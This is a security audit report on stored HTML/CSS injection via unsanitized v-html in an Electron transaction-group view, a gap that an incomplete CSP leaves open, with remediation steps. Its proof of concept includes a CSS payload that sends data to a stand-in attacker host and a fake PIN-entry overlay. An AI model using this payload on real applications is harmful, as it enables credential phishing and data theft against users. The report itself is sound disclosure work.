Audit Report

## Title
Stored HTML/CSS Injection via Unsanitized `v-html` in `CreateTransactionGroup.vue` with Incomplete CSP

## Summary
`CreateTransactionGroup.vue` renders user-controlled fields (`groupItem.description` and `transactionMemo`) directly through Vue's `v-html` directive without sanitization. In organization mode, these fields are stored in the shared back-end and rendered in every peer member's Electron renderer. The production CSP only restricts `script-src 'self'` and omits `style-src`, making injected `<style>` blocks fully functional. This enables a malicious organization member to perform persistent CSS injection and HTML overlay attacks against all other members who view the transaction group.

## Finding Description

**Unsanitized `v-html` binding — confirmed at exact lines:**

`CreateTransactionGroup.vue` lines 421–429 bind three user-controlled strings directly to `v-html` with no sanitization: [1](#0-0) 

The values `groupItem.description` (a free-text field stored in the shared PostgreSQL back-end) and `Transaction.fromBytes(groupItem.transactionBytes).transactionMemo` (embedded in serialized bytes also stored in the back-end) are rendered as raw HTML for every organization member who opens the view.

**Incomplete CSP — confirmed in `main/index.ts`:**

The production CSP is applied via `onHeadersReceived` and sets only `script-src 'self'`: [2](#0-1) 

There is no `style-src`, `default-src`, `img-src`, or `frame-src` directive. `script-src 'self'` blocks inline `<script>` tags and inline event handlers, but it does **not** block injected `<style>` blocks or CSS `url()` requests to external origins.

**Electron window security settings — confirmed in `mainWindow.ts`:** [3](#0-2) 

`nodeIntegration: false` and `contextIsolation: true` correctly prevent injected JavaScript from reaching Node.js APIs. However, `sandbox: false` means the renderer process is not OS-sandboxed, which is a weaker posture than full sandboxing.

## Impact Explanation

- **CSS injection is fully functional in production**: injected `<style>` blocks are not blocked by `script-src 'self'`. An attacker can use CSS attribute selectors with `url()` to exfiltrate rendered DOM content to an external server, or overlay the entire application UI with a fake prompt (fake PIN/password dialog, fake "approve transaction" button).
- **HTML injection** allows creation of fake UI elements visually indistinguishable from the real application, targeting peer organization members who have no reason to distrust content rendered inside the app.
- **Concrete harm**: a victim org member could be tricked into approving a malicious transaction or disclosing credentials, directly threatening funds managed by the organization.
- Escalation to full Node.js RCE via JavaScript is prevented by `nodeIntegration: false` + `contextIsolation: true`, which bounds the severity.

## Likelihood Explanation

- **Attacker precondition**: valid organization membership only — no admin or privileged role required.
- **Trigger**: the victim simply opens the transaction group view, a routine workflow action.
- **No browser bugs required**: the injection works within the normal HTML rendering path of `v-html`; the CSP gap (`style-src` unset) is a configuration omission, not a bypass.
- The attack is **persistent** (stored in the back-end) and affects every org member who views the group.

## Recommendation

1. **Remove `v-html`** from `CreateTransactionGroup.vue` lines 421–429. Use Vue's text interpolation (`{{ }}`) instead, which automatically escapes HTML. If rich formatting is genuinely required, sanitize with a library such as `DOMPurify` before passing to `v-html`.
2. **Strengthen the CSP** in `main/index.ts` to include at minimum:
   ```
   default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'
   ```
   This blocks injected `<style>` blocks and CSS `url()` exfiltration even if `v-html` is used elsewhere.
3. **Enable `sandbox: true`** in `mainWindow.ts` `webPreferences` for OS-level renderer sandboxing.
4. **Apply the CSP in development as well** — the current guard `if (!is.dev)` means the protection is absent during development and testing.

## Proof of Concept

A malicious organization member sets `description` on a transaction group item to:

```html
<style>
  body::after {
    content: url('https://attacker.example.com/exfil?d=' attr(data-testid));
  }
</style>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center">
  <p>Session expired. Please re-enter your PIN:</p>
  <input type="password" id="pin">
  <button>Submit</button>
</div>
```

This payload is stored in the back-end. When any peer organization member opens the "Create Transaction Group" page for that group, `v-html` renders the payload. The `<style>` block executes (not blocked by `script-src 'self'`), the CSS `url()` fires an outbound request, and the overlay is displayed over the entire application window.
